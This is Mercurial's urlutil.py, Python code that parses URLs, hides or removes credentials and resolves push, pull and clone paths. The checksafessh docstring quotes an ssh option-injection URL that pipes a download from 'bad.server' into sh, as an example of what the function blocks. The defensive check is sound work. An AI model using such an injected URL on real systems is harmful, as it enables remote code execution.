# utils.urlutil - code related to [paths] management
#
# Copyright 2005-2021 Olivia Mackall <olivia@selenic.com> and others
#
# This software may be used and distributed according to the terms of the
# GNU General Public License version 2 or any later version.
import os
import re as remod
import socket

from ..i18n import _
from ..pycompat import (
    getattr,
    setattr,
)
from .. import (
    encoding,
    error,
    pycompat,
    urllibcompat,
)


if pycompat.TYPE_CHECKING:
    from typing import (
        Union,
    )

urlreq = urllibcompat.urlreq


def getport(port):
    # type: (Union[bytes, int]) -> int
    """Return the port for a given network service.

    If port is an integer, it's returned as is. If it's a string, it's
    looked up using socket.getservbyname(). If there's no matching
    service, error.Abort is raised.
    """
    try:
        return int(port)
    except ValueError:
        pass

    try:
        return socket.getservbyname(pycompat.sysstr(port))
    except socket.error:
        raise error.Abort(
            _(b"no port number associated with service '%s'") % port
        )


class url(object):
    r"""Reliable URL parser.

    This parses URLs and provides attributes for the following
    components:

    <scheme>://<user>:<passwd>@<host>:<port>/<path>?<query>#<fragment>

    Missing components are set to None. The only exception is
    fragment, which is set to '' if present but empty.

    If parsefragment is False, fragment is included in query. If
    parsequery is False, query is included in path. If both are
    False, both fragment and query are included in path.

    See http://www.ietf.org/rfc/rfc2396.txt for more information.

    Note that for backward compatibility reasons, bundle URLs do not
    take host names. That means 'bundle://../' has a path of '../'.

    Examples:

    >>> url(b'http://www.ietf.org/rfc/rfc2396.txt')
    <url scheme: 'http', host: 'www.ietf.org', path: 'rfc/rfc2396.txt'>
    >>> url(b'ssh://[::1]:2200//home/joe/repo')
    <url scheme: 'ssh', host: '[::1]', port: '2200', path: '/home/joe/repo'>
    >>> url(b'file:///home/joe/repo')
    <url scheme: 'file', path: '/home/joe/repo'>
    >>> url(b'file:///c:/temp/foo/')
    <url scheme: 'file', path: 'c:/temp/foo/'>
    >>> url(b'bundle:foo')
    <url scheme: 'bundle', path: 'foo'>
    >>> url(b'bundle://../foo')
    <url scheme: 'bundle', path: '../foo'>
    >>> url(br'c:\foo\bar')
    <url path: 'c:\\foo\\bar'>
    >>> url(br'\\blah\blah\blah')
    <url path: '\\\\blah\\blah\\blah'>
    >>> url(br'\\blah\blah\blah#baz')
    <url path: '\\\\blah\\blah\\blah', fragment: 'baz'>
    >>> url(br'file:///C:\users\me')
    <url scheme: 'file', path: 'C:\\users\\me'>

    Authentication credentials:

    >>> url(b'ssh://joe:xyz@x/repo')
    <url scheme: 'ssh', user: 'joe', passwd: 'xyz', host: 'x', path: 'repo'>
    >>> url(b'ssh://joe@x/repo')
    <url scheme: 'ssh', user: 'joe', host: 'x', path: 'repo'>

    Query strings and fragments:

    >>> url(b'http://host/a?b#c')
    <url scheme: 'http', host: 'host', path: 'a', query: 'b', fragment: 'c'>
    >>> url(b'http://host/a?b#c', parsequery=False, parsefragment=False)
    <url scheme: 'http', host: 'host', path: 'a?b#c'>

    Empty path:

    >>> url(b'')
    <url path: ''>
    >>> url(b'#a')
    <url path: '', fragment: 'a'>
    >>> url(b'http://host/')
    <url scheme: 'http', host: 'host', path: ''>
    >>> url(b'http://host/#a')
    <url scheme: 'http', host: 'host', path: '', fragment: 'a'>

    Only scheme:

    >>> url(b'http:')
    <url scheme: 'http'>
    """

    _safechars = b"!~*'()+"
    _safepchars = b"/!~*'()+:\\"
    _matchscheme = remod.compile(b'^[a-zA-Z0-9+.\\-]+:').match

    def __init__(self, path, parsequery=True, parsefragment=True):
        # type: (bytes, bool, bool) -> None
        # We slowly chomp away at path until we have only the path left
        self.scheme = self.user = self.passwd = self.host = None
        self.port = self.path = self.query = self.fragment = None
        self._localpath = True
        self._hostport = b''
        self._origpath = path

        if parsefragment and b'#' in path:
            path, self.fragment = path.split(b'#', 1)

        # special case for Windows drive letters and UNC paths
        if hasdriveletter(path) or path.startswith(b'\\\\'):
            self.path = path
            return

        # For compatibility reasons, we can't handle bundle paths as
        # normal URLS
        if path.startswith(b'bundle:'):
            self.scheme = b'bundle'
            path = path[7:]
            if path.startswith(b'//'):
                path = path[2:]
            self.path = path
            return

        if self._matchscheme(path):
            parts = path.split(b':', 1)
            if parts[0]:
                self.scheme, path = parts
                self._localpath = False

        if not path:
            path = None
            if self._localpath:
                self.path = b''
                return
        else:
            if self._localpath:
                self.path = path
                return

            if parsequery and b'?' in path:
                path, self.query = path.split(b'?', 1)
                if not path:
                    path = None
                if not self.query:
                    self.query = None

            # // is required to specify a host/authority
            if path and path.startswith(b'//'):
                parts = path[2:].split(b'/', 1)
                if len(parts) > 1:
                    self.host, path = parts
                else:
                    self.host = parts[0]
                    path = None
                if not self.host:
                    self.host = None
                    # path of file:///d is /d
                    # path of file:///d:/ is d:/, not /d:/
                    if path and not hasdriveletter(path):
                        path = b'/' + path

            if self.host and b'@' in self.host:
                self.user, self.host = self.host.rsplit(b'@', 1)
                if b':' in self.user:
                    self.user, self.passwd = self.user.split(b':', 1)
                if not self.host:
                    self.host = None

            # Don't split on colons in IPv6 addresses without ports
            if (
                self.host
                and b':' in self.host
                and not (
                    self.host.startswith(b'[') and self.host.endswith(b']')
                )
            ):
                self._hostport = self.host
                self.host, self.port = self.host.rsplit(b':', 1)
                if not self.host:
                    self.host = None

            if (
                self.host
                and self.scheme == b'file'
                and self.host not in (b'localhost', b'127.0.0.1', b'[::1]')
            ):
                raise error.Abort(
                    _(b'file:// URLs can only refer to localhost')
                )

        self.path = path

        # leave the query string escaped
        for a in (b'user', b'passwd', b'host', b'port', b'path', b'fragment'):
            v = getattr(self, a)
            if v is not None:
                setattr(self, a, urlreq.unquote(v))

    def copy(self):
        u = url(b'temporary useless value')
        u.path = self.path
        u.scheme = self.scheme
        u.user = self.user
        u.passwd = self.passwd
        u.host = self.host
        u.path = self.path
        u.query = self.query
        u.fragment = self.fragment
        u._localpath = self._localpath
        u._hostport = self._hostport
        u._origpath = self._origpath
        return u

    @encoding.strmethod
    def __repr__(self):
        attrs = []
        for a in (
            b'scheme',
            b'user',
            b'passwd',
            b'host',
            b'port',
            b'path',
            b'query',
            b'fragment',
        ):
            v = getattr(self, a)
            if v is not None:
                attrs.append(b'%s: %r' % (a, pycompat.bytestr(v)))
        return b'<url %s>' % b', '.join(attrs)

    def __bytes__(self):
        r"""Join the URL's components back into a URL string.

        Examples:

        >>> bytes(url(b'http://user:pw@host:80/c:/bob?fo:oo#ba:ar'))
        'http://user:pw@host:80/c:/bob?fo:oo#ba:ar'
        >>> bytes(url(b'http://user:pw@host:80/?foo=bar&baz=42'))
        'http://user:pw@host:80/?foo=bar&baz=42'
        >>> bytes(url(b'http://user:pw@host:80/?foo=bar%3dbaz'))
        'http://user:pw@host:80/?foo=bar%3dbaz'
        >>> bytes(url(b'ssh://user:pw@[::1]:2200//home/joe#'))
        'ssh://user:pw@[::1]:2200//home/joe#'
        >>> bytes(url(b'http://localhost:80//'))
        'http://localhost:80//'
        >>> bytes(url(b'http://localhost:80/'))
        'http://localhost:80/'
        >>> bytes(url(b'http://localhost:80'))
        'http://localhost:80/'
        >>> bytes(url(b'bundle:foo'))
        'bundle:foo'
        >>> bytes(url(b'bundle://../foo'))
        'bundle:../foo'
        >>> bytes(url(b'path'))
        'path'
        >>> bytes(url(b'file:///tmp/foo/bar'))
        'file:///tmp/foo/bar'
        >>> bytes(url(b'file:///c:/tmp/foo/bar'))
        'file:///c:/tmp/foo/bar'
        >>> print(url(br'bundle:foo\bar'))
        bundle:foo\bar
        >>> print(url(br'file:///D:\data\hg'))
        file:///D:\data\hg
        """
        if self._localpath:
            s = self.path
            if self.scheme == b'bundle':
                s = b'bundle:' + s
            if self.fragment:
                s += b'#' + self.fragment
            return s

        s = self.scheme + b':'
        if self.user or self.passwd or self.host:
            s += b'//'
        elif self.scheme and (
            not self.path
            or self.path.startswith(b'/')
            or hasdriveletter(self.path)
        ):
            s += b'//'
            if hasdriveletter(self.path):
                s += b'/'
        if self.user:
            s += urlreq.quote(self.user, safe=self._safechars)
        if self.passwd:
            s += b':' + urlreq.quote(self.passwd, safe=self._safechars)
        if self.user or self.passwd:
            s += b'@'
        if self.host:
            if not (self.host.startswith(b'[') and self.host.endswith(b']')):
                s += urlreq.quote(self.host)
            else:
                s += self.host
        if self.port:
            s += b':' + urlreq.quote(self.port)
        if self.host:
            s += b'/'
        if self.path:
            # TODO: similar to the query string, we should not unescape the
            # path when we store it, the path might contain '%2f' = '/',
            # which we should *not* escape.
            s += urlreq.quote(self.path, safe=self._safepchars)
        if self.query:
            # we store the query in escaped form.
            s += b'?' + self.query
        if self.fragment is not None:
            s += b'#' + urlreq.quote(self.fragment, safe=self._safepchars)
        return s

    __str__ = encoding.strmethod(__bytes__)

    def authinfo(self):
        user, passwd = self.user, self.passwd
        try:
            self.user, self.passwd = None, None
            s = bytes(self)
        finally:
            self.user, self.passwd = user, passwd
        if not self.user:
            return (s, None)
        # authinfo[1] is passed to urllib2 password manager, and its
        # URIs must not contain credentials. The host is passed in the
        # URIs list because Python < 2.4.3 uses only that to search for
        # a password.
        return (s, (None, (s, self.host), self.user, self.passwd or b''))

    def isabs(self):
        if self.scheme and self.scheme != b'file':
            return True  # remote URL
        if hasdriveletter(self.path):
            return True  # absolute for our purposes - can't be joined()
        if self.path.startswith(br'\\'):
            return True  # Windows UNC path
        if self.path.startswith(b'/'):
            return True  # POSIX-style
        return False

    def localpath(self):
        # type: () -> bytes
        if self.scheme == b'file' or self.scheme == b'bundle':
            path = self.path or b'/'
            # For Windows, we need to promote hosts containing drive
            # letters to paths with drive letters.
            if hasdriveletter(self._hostport):
                path = self._hostport + b'/' + self.path
            elif (
                self.host is not None and self.path and not hasdriveletter(path)
            ):
                path = b'/' + path
            return path
        return self._origpath

    def islocal(self):
        '''whether localpath will return something that posixfile can open'''
        return (
            not self.scheme
            or self.scheme == b'file'
            or self.scheme == b'bundle'
        )


def hasscheme(path):
    # type: (bytes) -> bool
    return bool(url(path).scheme)  # cast to help pytype


def hasdriveletter(path):
    # type: (bytes) -> bool
    return bool(path) and path[1:2] == b':' and path[0:1].isalpha()


def urllocalpath(path):
    # type: (bytes) -> bytes
    return url(path, parsequery=False, parsefragment=False).localpath()


def checksafessh(path):
    # type: (bytes) -> None
    """check if a path / url is a potentially unsafe ssh exploit (SEC)

    This is a sanity check for ssh urls. ssh will parse the first item as
    an option; e.g. ssh://-oProxyCommand=curl${IFS}bad.server|sh/path.
    Let's prevent these potentially exploited urls entirely and warn the
    user.

    Raises an error.Abort when the url is unsafe.
    """
    path = urlreq.unquote(path)
    if path.startswith(b'ssh://-') or path.startswith(b'svn+ssh://-'):
        raise error.Abort(
            _(b'potentially unsafe url: %r') % (pycompat.bytestr(path),)
        )


def hidepassword(u):
    # type: (bytes) -> bytes
    '''hide user credential in a url string'''
    u = url(u)
    if u.passwd:
        u.passwd = b'***'
    return bytes(u)


def removeauth(u):
    # type: (bytes) -> bytes
    '''remove all authentication information from a url string'''
    u = url(u)
    u.user = u.passwd = None
    return bytes(u)


def get_push_paths(repo, ui, dests):
    """yields all the `path` selected as push destination by `dests`"""
    if not dests:
        if b'default-push' in ui.paths:
            yield ui.paths[b'default-push']
        elif b'default' in ui.paths:
            yield ui.paths[b'default']
        else:
            raise error.ConfigError(
                _(b'default repository not configured!'),
                hint=_(b"see 'hg help config.paths'"),
            )
    else:
        for dest in dests:
            yield ui.getpath(dest)


def get_pull_paths(repo, ui, sources, default_branches=()):
    """yields all the `(path, branch)` selected as pull source by `sources`"""
    if not sources:
        sources = [b'default']
    for source in sources:
        if source in ui.paths:
            url = ui.paths[source].rawloc
        else:
            # Try to resolve as a local path or URI.
            try:
                # we pass the ui instance are warning might need to be issued
                url = path(ui, None, rawloc=source).rawloc
            except ValueError:
                url = source
        yield parseurl(url, default_branches)


def get_unique_push_path(action, repo, ui, dest=None):
    """return a unique `path` or abort if multiple are found

    This is useful for command and action that does not support multiple
    destination (yet).

    Note that for now, we cannot get multiple destination so this function is "trivial".

    The `action` parameter will be used for the error message.
    """
    if dest is None:
        dests = []
    else:
        dests = [dest]
    dests = list(get_push_paths(repo, ui, dests))
    assert len(dests) == 1
    return dests[0]


def get_unique_pull_path(action, repo, ui, source=None, default_branches=()):
    """return a unique `(path, branch)` or abort if multiple are found

    This is useful for command and action that does not support multiple
    destination (yet).

    Note that for now, we cannot get multiple destination so this function is "trivial".

    The `action` parameter will be used for the error message.
    """
    if source is None:
        if b'default' in ui.paths:
            url = ui.paths[b'default'].rawloc
        else:
            # XXX this is the historical default behavior, but that is not
            # great, consider breaking BC on this.
            url = b'default'
    else:
        if source in ui.paths:
            url = ui.paths[source].rawloc
        else:
            # Try to resolve as a local path or URI.
            try:
                # we pass the ui instance are warning might need to be issued
                url = path(ui, None, rawloc=source).rawloc
            except ValueError:
                url = source
    return parseurl(url, default_branches)


def get_clone_path(ui, source, default_branches=()):
    """return the `(origsource, path, branch)` selected as clone source"""
    if source is None:
        if b'default' in ui.paths:
            url = ui.paths[b'default'].rawloc
        else:
            # XXX this is the historical default behavior, but that is not
            # great, consider breaking BC on this.
            url = b'default'
    else:
        if source in ui.paths:
            url = ui.paths[source].rawloc
        else:
            # Try to resolve as a local path or URI.
            try:
                # we pass the ui instance are warning might need to be issued
                url = path(ui, None, rawloc=source).rawloc
            except ValueError:
                url = source
    clone_path, branch = parseurl(url, default_branches)
    return url, clone_path, branch


def parseurl(path, branches=None):
    '''parse url#branch, returning (url, (branch, branches))'''
    u = url(path)
    branch = None
    if u.fragment:
        branch = u.fragment
        u.fragment = None
    return bytes(u), (branch, branches or [])


class paths(dict):
    """Represents a collection of paths and their configs.

    Data is initially derived from ui instances and the config files they have
    loaded.
    """

    def __init__(self, ui):
        dict.__init__(self)

        for name, loc in ui.configitems(b'paths', ignoresub=True):
            # No location is the same as not existing.
            if not loc:
                continue
            loc, sub_opts = ui.configsuboptions(b'paths', name)
            self[name] = path(ui, name, rawloc=loc, suboptions=sub_opts)

        for name, p in sorted(self.items()):
            p.chain_path(ui, self)

    def getpath(self, ui, name, default=None):
        """Return a ``path`` from a string, falling back to default.

        ``name`` can be a named path or locations. Locations are filesystem
        paths or URIs.

        Returns None if ``name`` is not a registered path, a URI, or a local
        path to a repo.
        """
        # Only fall back to default if no path was requested.
        if name is None:
            if not default:
                default = ()
            elif not isinstance(default, (tuple, list)):
                default = (default,)
            for k in default:
                try:
                    return self[k]
                except KeyError:
                    continue
            return None

        # Most likely empty string.
        # This may need to raise in the future.
        if not name:
            return None

        try:
            return self[name]
        except KeyError:
            # Try to resolve as a local path or URI.
            try:
                # we pass the ui instance are warning might need to be issued
                return path(ui, None, rawloc=name)
            except ValueError:
                raise error.RepoError(_(b'repository %s does not exist') % name)


_pathsuboptions = {}


def pathsuboption(option, attr):
    """Decorator used to declare a path sub-option.

    Arguments are the sub-option name and the attribute it should set on
    ``path`` instances.

    The decorated function will receive as arguments a ``ui`` instance,
    ``path`` instance, and the string value of this option from the config.
    The function should return the value that will be set on the ``path``
    instance.

    This decorator can be used to perform additional verification of
    sub-options and to change the type of sub-options.
    """

    def register(func):
        _pathsuboptions[option] = (attr, func)
        return func

    return register


@pathsuboption(b'pushurl', b'pushloc')
def pushurlpathoption(ui, path, value):
    u = url(value)
    # Actually require a URL.
    if not u.scheme:
        ui.warn(_(b'(paths.%s:pushurl not a URL; ignoring)\n') % path.name)
        return None

    # Don't support the #foo syntax in the push URL to declare branch to
    # push.
    if u.fragment:
        ui.warn(
            _(
                b'("#fragment" in paths.%s:pushurl not supported; '
                b'ignoring)\n'
            )
            % path.name
        )
        u.fragment = None

    return bytes(u)


@pathsuboption(b'pushrev', b'pushrev')
def pushrevpathoption(ui, path, value):
    return value


class path(object):
    """Represents an individual path and its configuration."""

    def __init__(self, ui, name, rawloc=None, suboptions=None):
        """Construct a path from its config options.

        ``ui`` is the ``ui`` instance the path is coming from.
        ``name`` is the symbolic name of the path.
        ``rawloc`` is the raw location, as defined in the config.
        ``pushloc`` is the raw locations pushes should be made to.

        If ``name`` is not defined, we require that the location be a) a local
        filesystem path with a .hg directory or b) a URL. If not,
        ``ValueError`` is raised.
        """
        if not rawloc:
            raise ValueError(b'rawloc must be defined')

        # Locations may define branches via syntax <base>#<branch>.
        u = url(rawloc)
        branch = None
        if u.fragment:
            branch = u.fragment
            u.fragment = None

        self.url = u
        # the url from the config/command line before dealing with `path://`
        self.raw_url = u.copy()
        self.branch = branch

        self.name = name
        self.rawloc = rawloc
        self.loc = b'%s' % u

        self._validate_path()

        _path, sub_opts = ui.configsuboptions(b'paths', b'*')
        self._own_sub_opts = {}
        if suboptions is not None:
            self._own_sub_opts = suboptions.copy()
            sub_opts.update(suboptions)
        self._all_sub_opts = sub_opts.copy()

        self._apply_suboptions(ui, sub_opts)

    def chain_path(self, ui, paths):
        if self.url.scheme == b'path':
            assert self.url.path is None
            try:
                subpath = paths[self.url.host]
            except KeyError:
                m = _(b'cannot use `%s`, "%s" is not a known path')
                m %= (self.rawloc, self.url.host)
                raise error.Abort(m)
            if subpath.raw_url.scheme == b'path':
                m = _(b'cannot use `%s`, "%s" is also defined as a `path://`')
                m %= (self.rawloc, self.url.host)
                raise error.Abort(m)
            self.url = subpath.url
            self.rawloc = subpath.rawloc
            self.loc = subpath.loc
            if self.branch is None:
                self.branch = subpath.branch
            else:
                base = self.rawloc.rsplit(b'#', 1)[0]
                self.rawloc = b'%s#%s' % (base, self.branch)
            suboptions = subpath._all_sub_opts.copy()
            suboptions.update(self._own_sub_opts)
            self._apply_suboptions(ui, suboptions)

    def _validate_path(self):
        # When given a raw location but not a symbolic name, validate the
        # location is valid.
        if (
            not self.name
            and not self.url.scheme
            and not self._isvalidlocalpath(self.loc)
        ):
            raise ValueError(
                b'location is not a URL or path to a local '
                b'repo: %s' % self.rawloc
            )

    def _apply_suboptions(self, ui, sub_options):
        # Now process the sub-options. If a sub-option is registered, its
        # attribute will always be present. The value will be None if there
        # was no valid sub-option.
        for suboption, (attr, func) in pycompat.iteritems(_pathsuboptions):
            if suboption not in sub_options:
                setattr(self, attr, None)
                continue

            value = func(ui, self, sub_options[suboption])
            setattr(self, attr, value)

    def _isvalidlocalpath(self, path):
        """Returns True if the given path is a potentially valid repository.
        This is its own function so that extensions can change the definition of
        'valid' in this case (like when pulling from a git repo into a hg
        one)."""
        try:
            return os.path.isdir(os.path.join(path, b'.hg'))
        # Python 2 may return TypeError. Python 3, ValueError.
        except (TypeError, ValueError):
            return False

    @property
    def suboptions(self):
        """Return sub-options and their values for this path.

        This is intended to be used for presentation purposes.
        """
        d = {}
        for subopt, (attr, _func) in pycompat.iteritems(_pathsuboptions):
            value = getattr(self, attr)
            if value is not None:
                d[subopt] = value
        return d
